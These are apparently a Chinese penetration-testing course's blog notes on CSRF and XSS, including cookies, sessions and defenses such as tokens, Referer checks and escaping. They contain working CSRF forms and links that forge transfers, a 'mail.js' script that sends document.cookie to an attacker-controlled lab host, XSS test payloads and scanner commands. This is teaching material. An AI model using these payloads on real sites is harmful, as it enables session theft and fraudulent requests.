        <content type="html"><![CDATA[<h1 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h1><ol><li>什么是CSRF漏洞？</li><li>CSRF案例分析 </li><li>CSRF漏洞挖掘 </li><li>CSRF漏洞防御</li></ol><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>Cross-Site Request Forgery </p><p>跨站请求伪造</p><p>第三方网站利用被攻击网站<strong>生效的cookie</strong>,直接对服务器接口发起请求</p><h1 id="CSRF实现流程"><a href="#CSRF实现流程" class="headerlink" title="CSRF实现流程"></a>CSRF实现流程</h1><p><img src="/assets/image-20221121145522952.png" alt="image-20221121145522952"></p><h1 id="CSRF案例分析"><a href="#CSRF案例分析" class="headerlink" title="CSRF案例分析"></a>CSRF案例分析</h1><p>Gmail CSRF漏洞（设置邮件转发） </p><p>Weibo CSRF漏洞（自动关注账号）</p><h1 id="CSRF漏洞危害"><a href="#CSRF漏洞危害" class="headerlink" title="CSRF漏洞危害"></a>CSRF漏洞危害</h1><p>例如：</p><ul><li>修改账户信息 </li><li>利用管理员账号，上传木马文件 </li><li>传播蠕虫病毒（点击、扩散、点击……） </li><li>和其他攻击手段配合，实现攻击，比如XSS、SQL注入</li></ul><h2 id="XSS漏洞危害"><a href="#XSS漏洞危害" class="headerlink" title="XSS漏洞危害"></a>XSS漏洞危害</h2><ul><li>获取cookie，实现冒充身份的后续操作 </li><li>刷点击 </li><li>弹广告 </li><li>传播蠕虫病</li></ul><h2 id="CSRF与XSS区别"><a href="#CSRF与XSS区别" class="headerlink" title="CSRF与XSS区别"></a>CSRF与XSS区别</h2><p><img src="/assets/image-20221121145550382.png" alt="image-20221121145550382"></p><h1 id="CSRF-payload"><a href="#CSRF-payload" class="headerlink" title="CSRF payload"></a>CSRF payload</h1><ul><li>通过<strong>图片</strong>的img src属性，<strong>自动</strong>加载，发起<strong>GET</strong>请求</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;img src="http://192.168.31.193:8087/transfer.php?nameid=1102&amp;amount=1000" width= "0" height="0"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>构建一个<strong>超链接</strong>，用户<strong>点击</strong>以后，发起GET请求</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>http://192.168.31.193:8087/transfer.php?amount=1000&amp;to=jiangang<span class="token punctuation">"</span></span> <span class="token attr-name">taget</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>小姐姐在线视频聊天！！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>构建一个<strong>隐藏表单</strong>，用户访问，<strong>自动</strong>提交，发起<strong>POST</strong>请求</p><pre class="line-numbers language-none"><code class="language-none">&lt;form action="http://superbank.com/withdraw" method=POST&gt;&lt;input type="hidden" name="account" value="xiaoming" /&gt;&lt;input type="hidden" name="amount" value="1000" /&gt;&lt;input type="hidden" name="to" value="jiangang" /&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h1 id="CSRF漏洞挖掘"><a href="#CSRF漏洞挖掘" class="headerlink" title="CSRF漏洞挖掘"></a>CSRF漏洞挖掘</h1><h2 id="确定一个接口地址有没有CSRF漏洞"><a href="#确定一个接口地址有没有CSRF漏洞" class="headerlink" title="确定一个接口地址有没有CSRF漏洞"></a>确定一个<strong>接口地址</strong>有没有CSRF漏洞</h2><p>从第三方网站直接调用接口可以成功</p><h2 id="具体怎么操作"><a href="#具体怎么操作" class="headerlink" title="具体怎么操作"></a>具体怎么操作</h2><p>抓取正常通信请求的数据包，再请求一次</p><h2 id="有没有工具可以使用"><a href="#有没有工具可以使用" class="headerlink" title="有没有工具可以使用"></a>有没有工具可以使用</h2><h3 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h3><p><img src="/assets/image-20221121164549560.png" alt="image-20221121164549560"></p><h3 id="CSRF-Tester"><a href="#CSRF-Tester" class="headerlink" title="CSRF Tester"></a>CSRF Tester</h3><h3 id="Bolt"><a href="#Bolt" class="headerlink" title="Bolt"></a>Bolt</h3><p>安装</p><p><code>git clonehttps://github.com/s0md3v/Bolt</code> </p><p>检测</p><p><a href="http://192.168.31.193:8087/transfer.php%E6%9C%89%E6%B2%A1%E6%9C%89csrf%E6%BC%8F%E6%B4%9E">http://192.168.31.193:8087/transfer.php有没有csrf漏洞</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">┌──<span class="token punctuation">(</span>root㉿guoyx<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">/</span>home<span class="token operator">/</span>kali<span class="token operator">/</span>Bolt<span class="token punctuation">]</span>└─<span class="token comment"># python3 bolt.py -u http://192.168.31.193:8087/transfer.php</span>     ⚡ BOLT  ⚡    <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>python3<span class="token punctuation">.</span><span class="token number">10</span><span class="token operator">/</span>dist<span class="token operator">-</span>packages<span class="token operator">/</span>fuzzywuzzy<span class="token operator">/</span>fuzz<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span> UserWarning<span class="token punctuation">:</span> Using slow pure<span class="token operator">-</span>python SequenceMatcher<span class="token punctuation">.</span> Install python<span class="token operator">-</span>Levenshtein to remove this warning  warnings<span class="token punctuation">.</span>warn<span class="token punctuation">(</span><span class="token string">'Using slow pure-python SequenceMatcher. Install python-Levenshtein to remove this warning'</span><span class="token punctuation">)</span> ⚡ Phase<span class="token punctuation">:</span> Crawling <span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token punctuation">]</span> Parsing http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">192.168</span><span class="token number">.31</span><span class="token number">.193</span><span class="token punctuation">:</span><span class="token number">8087</span><span class="token operator">/</span>transfer<span class="token punctuation">.</span>php      <span class="token punctuation">[</span>!<span class="token punctuation">]</span> Crawled <span class="token number">1</span> URL<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">and</span> found <span class="token number">1</span> form<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>           ⚡ Phase<span class="token punctuation">:</span> Evaluating <span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">/</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Insecure form<span class="token punctuation">(</span>s<span class="token punctuation">)</span> found<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">192.168</span><span class="token number">.31</span><span class="token number">.193</span><span class="token punctuation">:</span><span class="token number">8087</span><span class="token operator">/</span>transfer<span class="token punctuation">.</span>php <span class="token punctuation">[</span>http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">192.168</span><span class="token number">.31</span><span class="token number">.193</span><span class="token punctuation">:</span><span class="token number">8087</span><span class="token operator">/</span>login<span class="token punctuation">.</span>php<span class="token punctuation">]</span> ⚡ Phase<span class="token punctuation">:</span> Comparing <span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">/</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> No CSRF protection to test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现有csrf,没有做防护。</p><h3 id="漏洞扫描服务"><a href="#漏洞扫描服务" class="headerlink" title="漏洞扫描服务"></a>漏洞扫描服务</h3><p><a href="https://cloud.tencent.com/product/vss">https://cloud.tencent.com/product/vss</a></p><h1 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h1><h2 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h2><ul><li>区分一个请求是<strong>来源</strong>于自己的前端页面，还是第三方的网站。</li><li>让自己的前端页面和伪造的<strong>请求变得不一 样</strong>。</li></ul><h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><p>Referrer：引用页; 引荐; 来源页面 </p><p>作用：<strong>跟踪来源</strong>，比如访问统计、广告效果</p><p>检查REFERER :</p><p>referer里面是否包含了主机名,IP或域名</p><h3 id="referer的不足"><a href="#referer的不足" class="headerlink" title="referer的不足"></a>referer的不足</h3><ol><li>可以任意修改 </li><li>可以为空</li></ol><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>在请求中加入一些<strong>随机字段</strong>,</p><p>第三方不知道也猜不出来,让第三方网站无法伪造请求</p><ol><li>用户使用用户名密码登录，<strong>服务端</strong>下发一个<strong>随机的</strong> token字段给客户端，并且服务端把这个字段保存在 <strong>session</strong>中。</li><li><strong>客户端</strong>把这个token保存起来，放到<strong>隐藏字段</strong>。 </li><li><strong>用户</strong>在登陆状态下，在之后<strong>访问</strong>的时候，都要<strong>携带这个token字段</strong>。</li><li><strong>服务端</strong>从session中拿出token值进行<strong>对比</strong>，如果 一致，说明请求合法。</li><li>用户退出，<strong>session销毁，token失效</strong>。</li></ol><h3 id="Token不足"><a href="#Token不足" class="headerlink" title="Token不足"></a>Token不足</h3><p>例如还存在xss漏洞，csrf和xss组合，用<strong>xss获取到token</strong>,再利用csrf漏洞。</p><h2 id="二次验证"><a href="#二次验证" class="headerlink" title="二次验证"></a>二次验证</h2><ul><li>验证码 </li><li>短信</li><li>扫码 </li><li>人脸识别 </li><li>reCAPTCHA（IP验证）</li></ul><h2 id="浏览器的保护措施"><a href="#浏览器的保护措施" class="headerlink" title="浏览器的保护措施"></a>浏览器的保护措施</h2><h4 id="Referrer-Policy"><a href="#Referrer-Policy" class="headerlink" title="Referrer Policy"></a>Referrer Policy</h4><p><code>strict-origin-when-cross-origin</code></p><h2 id="个人用户建议"><a href="#个人用户建议" class="headerlink" title="个人用户建议"></a>个人用户建议</h2><ol><li>不要访问不安全的网站 </li><li>不要随意点开别人 发给你的链接</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/huo-qu-cookie-fa-song-you-jian/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/huo-qu-cookie-fa-song-you-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="mail-js"><a href="#mail-js" class="headerlink" title="mail.js"></a>mail.js</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> img <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>img<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>img<span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>img<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'http://192.168.31.193:8082/sendmail.php?mycookie='</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="sendmail-php"><a href="#sendmail-php" class="headerlink" title="sendmail.php"></a>sendmail.php</h1><p>payload</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;script src=\'http://192.168.31.193:8082/mail.js\'&gt;<span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="http://192.168.31.193:8082/store.html">http://192.168.31.193:8082/store.html</a> </p><p>输入用户名产生cookie </p><p>访问 <a href="http://192.168.31.193:8082/query.php?id=1">http://192.168.31.193:8082/query.php?id=1</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/jiao-ben-zhu-ru-wang-ye-xss/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/jiao-ben-zhu-ru-wang-ye-xss/</url>
      
        <content type="html"><![CDATA[<h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><h2 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h2><p><a href="http://192.168.31.193:8082/reflect.html">http://192.168.31.193:8082/reflect.html</a><br><strong>POST请求</strong> </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h2><p><a href="http://192.168.31.193:8082/get.html">http://192.168.31.193:8082/get.html</a><br>get请求 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?url<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span>/wuya/<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><p> 恶意攻击者利用web页面的漏洞，插入一些恶意 代码，当用户访问页面的时候，代码就会执行， 这个时候就达到了攻击的目的。</p><p> 除了JavaScript之外，这个脚本也可以是Java、 VBScript、ActiveX、Flash等等 </p><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><p><img src="/picture/%E5%8F%8D%E5%B0%84%E5%9E%8Bxss.png" alt="反射型"></p><p>包括DOM型 </p><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p><img src="/picture/image-20221119181504318.png" alt="image-20221119181504318"></p><p>利用点:文章、留言板、公告板、评论…… </p><p>演示</p><p> <a href="http://192.168.31.193:8082/store.html">http://192.168.31.193:8082/store.html</a> </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应数据库的xss表 </p><p>攻击 <a href="http://192.168.31.193:8082/query.php?id=">http://192.168.31.193:8082/query.php?id=</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/fu-wu-qi-duan-session/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/fu-wu-qi-duan-session/</url>
      
        <content type="html"><![CDATA[<h1 id="Cookie的缺点"><a href="#Cookie的缺点" class="headerlink" title="Cookie的缺点"></a>Cookie的缺点</h1><p> 客户端存储量过大</p><p> 增加通信成本 </p><h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>把身份信息存储在服务器 </p><p>用Cookie给客户端下发一个Session ID </p><p>PHP SESSINO ID </p><p>Java Session ID </p><h1 id="session校验"><a href="#session校验" class="headerlink" title="session校验"></a>session校验</h1><h2 id="开启会话"><a href="#开启会话" class="headerlink" title="开启会话"></a>开启会话</h2><p>session_start() cookie/login.php </p><p>把session的字段值保存到以sessionid命名的文件 </p><h2 id="保存字段"><a href="#保存字段" class="headerlink" title="保存字段"></a>保存字段</h2><p>$_SESSION赋值 cookie/login.php </p><h2 id="校验ID"><a href="#校验ID" class="headerlink" title="校验ID"></a>校验ID</h2><p>从服务端的cookie中取出字段 cookie/index.php </p><h1 id="session销毁"><a href="#session销毁" class="headerlink" title="session销毁"></a>session销毁</h1><p>session_destory() cookie/logout.php </p><h1 id="代码演示"><a href="#代码演示" class="headerlink" title="代码演示"></a>代码演示</h1><p><a href="http://192.168.31.193:8081/">http://192.168.31.193:8081</a></p><p>用户名：admin </p><p>密码：123456</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/ke-hu-duan-cookie/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/ke-hu-duan-cookie/</url>
      
        <content type="html"><![CDATA[<h1 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h1><p>每一个请求都是独立的 </p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>需要重复鉴别身份 </p><h1 id="需求1"><a href="#需求1" class="headerlink" title="需求1"></a>需求1</h1><p>保持会话 </p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><ul><li>服务端给客户端下发标识</li></ul><ul><li>cookie key/value格式的文本: name=wuya,id=99</li></ul><h1 id="产生流程"><a href="#产生流程" class="headerlink" title="产生流程"></a>产生流程</h1><h2 id="浏览器第一次访问"><a href="#浏览器第一次访问" class="headerlink" title="浏览器第一次访问"></a>浏览器第一次访问</h2><p>服务器在响应中通过Set-Cookie头字段，下发 Cookie </p><h2 id="浏览器保存在本地"><a href="#浏览器保存在本地" class="headerlink" title="浏览器保存在本地"></a>浏览器保存在本地</h2><h3 id="硬盘"><a href="#硬盘" class="headerlink" title="硬盘"></a>硬盘</h3><p>有过期时间的Cookie</p><p><code>C:\Users\15542\AppData\Local\Google\ Chrome\User Data\Default\ </code></p><h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><p>没有过期时间的临时Cookie，退出浏览器即失效 </p><h2 id="浏览器随后访问"><a href="#浏览器随后访问" class="headerlink" title="浏览器随后访问"></a>浏览器随后访问</h2><p>在请求头中用Cookie字段发给服务器 </p><h1 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h1><h2 id="name-x3D-value"><a href="#name-x3D-value" class="headerlink" title="name=value"></a>name=value</h2><p> 一个name/value，就是一个cookie。name/ value这个是必须的，其他的都是可选的。如果 name重复，只取第一个</p><h2 id="expires"><a href="#expires" class="headerlink" title="expires"></a>expires</h2><p> cookie的过期时间（格林尼治时间），超过这个 时间，cookie就会失效。如果不设置，代表是临 时的cookie，cookie在浏览器关闭的时候就失效 了。</p><h2 id="max-age"><a href="#max-age" class="headerlink" title="max-age"></a>max-age</h2><p>与expires作用相同，用来告诉浏览器此cookie 多久过期（单位是秒）。max-age的优先级高于 expires</p><h2 id="domain"><a href="#domain" class="headerlink" title="domain"></a>domain</h2><p>cookie对哪个域名生效。如果没有设置，就设置 为服务器的域名。如果是临时的cookie，就不能 设置domain。</p><ul><li>比如.baidu.com，百度所有的子站都可以使用。 </li><li>zhidao.baidu.com只能百度知道使用。</li><li>Cookie具有不可跨域名性。这个是由浏览器保证 的，google服务器不能修改baidu的cookie。</li></ul><h2 id="path"><a href="#path" class="headerlink" title="path"></a>path</h2><p>除了匹配域名，还可以具体匹配到路径，如果域 名和路径都匹配，那这个cookie就会起作用。 </p><p>如果是/，这个服务器所有的路径都可以使用这 个cookie。如果没有设置，那个路径响应，path 就是哪个值 </p><h2 id="secure"><a href="#secure" class="headerlink" title="secure"></a>secure</h2><p>只有HTTPS连接，才发送cookie到服务器 </p><h2 id="httponly"><a href="#httponly" class="headerlink" title="httponly"></a>httponly</h2><p>告知浏览器不允许通过脚本document.cookie去 更改这个值，同样这个值在document.cookie中 也不可见 </p><h1 id="Cookie特点"><a href="#Cookie特点" class="headerlink" title="Cookie特点"></a>Cookie特点</h1><ul><li>明文 </li><li>可修改 比如火狐浏览器 </li><li>大小受限</li></ul><h1 id="cookie的用途"><a href="#cookie的用途" class="headerlink" title="cookie的用途"></a>cookie的用途</h1><ul><li>保持会话 </li><li>记住密码 </li><li>跟踪用户行为</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/xss-fang-yu/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/xss-fang-yu/</url>
      
        <content type="html"><![CDATA[<h1 id="测试payload"><a href="#测试payload" class="headerlink" title="测试payload"></a>测试payload</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">=</span>'<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>"<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">%</span>3Cscript<span class="token operator">%</span><span class="token number">3</span><span class="token function">Ealert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token operator">%</span>3C<span class="token operator">/</span>script<span class="token operator">%</span>3E<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascript:alert('XSS')"</span><span class="token operator">&gt;</span>onerror<span class="token operator">=</span><span class="token string">"alert('XSS')"</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h1><p>识别：正则<script></p><p>处理：<scr_ipt></p><h2 id="WAF过滤"><a href="#WAF过滤" class="headerlink" title="WAF过滤"></a>WAF过滤</h2><p>WAF——web application firewall</p><p>web应用防火墙</p><h3 id="modsecurity"><a href="#modsecurity" class="headerlink" title="modsecurity"></a><strong>modsecurity</strong></h3><p><a href="https://github.com/SpiderLabs/ModSecurity">https://github.com/SpiderLabs/ModSecurity</a></p><h1 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h1><p>htmlspecialchars()转义</p></script></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/xss-jian-cha-yu-li-yong/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/xss-jian-cha-yu-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="xsser"><a href="#xsser" class="headerlink" title="xsser"></a>xsser</h1><h2 id="主要特性"><a href="#主要特性" class="headerlink" title="主要特性"></a>主要特性</h2><p>同时使用GET和POST方法注入。 </p><p>包括各种过滤器和绕过技术。 </p><p>可以与命令行和GUI一起使用。 </p><p>将提供攻击的详细统计数据。</p><h2 id="查看参数"><a href="#查看参数" class="headerlink" title="查看参数"></a>查看参数</h2><pre class="line-numbers language-none"><code class="language-none">xsser -h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参考 </p><p><a href="https://www.freebuf.com/sectool/173228.html">https://www.freebuf.com/sectool/173228.html</a></p><h2 id="检查接口"><a href="#检查接口" class="headerlink" title="检查接口"></a>检查接口</h2><pre class="line-numbers language-none"><code class="language-none">xsser -u "http://192.168.31.193:8084/vulnerabilities/" -g "xss_r/?name=XSS" --cookie="security=low; PHPSESSID=9j7j5aml5k3nqj5st6grtfaiqa" -s -v --reverse-check<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：替换成DVWA最新的cookie</p><h2 id="基于搜索引擎语法检测"><a href="#基于搜索引擎语法检测" class="headerlink" title="基于搜索引擎语法检测"></a>基于搜索引擎语法检测</h2><pre class="line-numbers language-none"><code class="language-none">xsser –De "google" -d "search.php?q=" <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="图形化界面"><a href="#图形化界面" class="headerlink" title="图形化界面"></a>图形化界面</h2><pre class="line-numbers language-none"><code class="language-none">xsser --gtk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="XSStrike"><a href="#XSStrike" class="headerlink" title="XSStrike"></a>XSStrike</h1><h2 id="整体介绍"><a href="#整体介绍" class="headerlink" title="整体介绍"></a>整体介绍</h2><ul><li>生成payload </li><li>爬虫功能 </li><li>探测WAF</li></ul><h2 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/s0md3v/XSStrike<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>python 3.6 以上 </p><h2 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h2><pre class="line-numbers language-none"><code class="language-none">python3 xsstrike.py -h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><pre class="line-numbers language-none"><code class="language-none">python3 xsstrike.py -u 'http://192.168.70.130/vul/xss/xss_reflected_get.php?message=321&amp;submit=submit' <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><pre class="line-numbers language-none"><code class="language-none">python3 xsstrike.py -u "http://192.168.31.193:8082/reflect.php" --data 'name=1' <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h2><pre class="line-numbers language-none"><code class="language-none">python3 xsstrike.py -u "http://192.168.31.193:8082/get.html?url=1" <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/sectool/173228.html">https://www.freebuf.com/sectool/173228.html</a></p><p><a href="https://blog.csdn.net/gao646467783/article/details/113249158">https://blog.csdn.net/gao646467783/article/details/113249158</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/xss-ping-tai/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/xss-ping-tai/</url>
      
